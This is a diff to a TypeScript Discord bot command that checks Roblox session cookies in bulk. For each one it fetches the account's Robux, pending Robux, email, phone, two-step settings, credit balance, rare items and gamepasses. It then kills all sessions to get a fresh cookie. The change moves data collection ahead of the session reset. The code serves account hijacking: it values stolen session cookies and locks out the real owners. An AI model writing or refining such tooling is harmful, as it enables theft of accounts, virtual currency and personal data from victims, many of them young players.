@@ -80,7 +80,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
-    await interaction.editReply({ embeds: [buildProgressEmbed(`Resetting & scanning ${cookies.length} cookie(s)...`)] });
+    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
 
     let validCount = 0;
     let invalidCount = 0;
@@ -89,13 +89,45 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const outputLines: string[] = [];
 
     for (const rawCookie of cookies) {
+      // Step 1: Validate
       const validation = await Roblox.validateCookie(rawCookie);
       if (!validation.valid) {
         invalidCount++;
         continue;
       }
 
-      // --- Reset (kill all sessions, get new cookie) ---
+      validCount++;
+      const userId = String(validation.userId!);
+      const username = validation.username!;
+      const displayName = validation.displayName || null;
+
+      // Step 2: Fetch account data using the ORIGINAL cookie
+      const [
+        ageData, ageGroup,
+        robux, summary, country, email, parental, thumb,
+        credit, twoStep, phone, rap,
+        pendingRobux, ownedRares,
+      ] = await Promise.all([
+        Roblox.getUserAge(validation.userId!),
+        Roblox.fetchAgeGroup(rawCookie),
+        Roblox.fetchRobux(rawCookie, userId),
+        Roblox.fetchTransactionTotals(rawCookie, userId),
+        Roblox.fetchCountry(rawCookie),
+        Roblox.fetchEmailInfo(rawCookie),
+        Roblox.fetchParentalControls(rawCookie),
+        Roblox.fetchAvatarThumbnail(userId),
+        Roblox.fetchCreditBalance(rawCookie),
+        Roblox.fetchTwoStepConfig(rawCookie, userId),
+        Roblox.fetchPhoneInfo(rawCookie),
+        Roblox.fetchRolimonsRAP(userId),
+        Roblox.fetchPendingRobux(rawCookie, userId),
+        Roblox.getOwnedRareItems(rawCookie, userId),
+      ]);
+
+      totalRobux += robux;
+      totalPending += pendingRobux;
+
+      // Step 3: Reset to get fresh cookie (optional, after data fetched)
       const resetResult = await Roblox.killAndRefreshSession(rawCookie);
       let workingCookie = rawCookie;
       let resetNote = '';
@@ -105,36 +137,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       } else {
         resetNote = '⚠️ Reset failed, using old cookie';
       }
-      validCount++;
-
-      const userId = String(validation.userId!);
-      const username = validation.username!;
-      const displayName = validation.displayName || null;
-
-      const [
-        ageData, ageGroup,
-        robux, summary, country, email, parental, thumb,
-        credit, twoStep, phone, rap,
-        pendingRobux, ownedRares,
-      ] = await Promise.all([
-        Roblox.getUserAge(validation.userId!),
-        Roblox.fetchAgeGroup(workingCookie),
-        Roblox.fetchRobux(workingCookie, userId),
-        Roblox.fetchTransactionTotals(workingCookie, userId),
-        Roblox.fetchCountry(workingCookie),
-        Roblox.fetchEmailInfo(workingCookie),
-        Roblox.fetchParentalControls(workingCookie),
-        Roblox.fetchAvatarThumbnail(userId),
-        Roblox.fetchCreditBalance(workingCookie),
-        Roblox.fetchTwoStepConfig(workingCookie, userId),
-        Roblox.fetchPhoneInfo(workingCookie),
-        Roblox.fetchRolimonsRAP(userId),
-        Roblox.fetchPendingRobux(workingCookie, userId),
-        Roblox.getOwnedRareItems(workingCookie, userId),
-      ]);
-
-      totalRobux += robux;
-      totalPending += pendingRobux;
 
       const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;
 
@@ -155,7 +157,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         try {
           const passes = await Roblox.getGamepasses(game.universeId);
           for (const gp of passes) {
-            const owns = await Roblox.checkOwnsGamepass(workingCookie, userId, gp.id);
+            const owns = await Roblox.checkOwnsGamepass(rawCookie, userId, gp.id);
             if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
           }
         } catch {}
@@ -195,7 +197,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
 
-    // Final summary
     const totalCookies = cookies.length;
     const summaryText =
       `✧ **Results**\n` +
@@ -208,7 +209,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     const summaryEmbed = buildSuccessEmbed(summaryText);
 
-    // Build the output file
     const fileContentOutput = outputLines.length
       ? outputLines.join('\n')
       : 'No valid cookies found.';
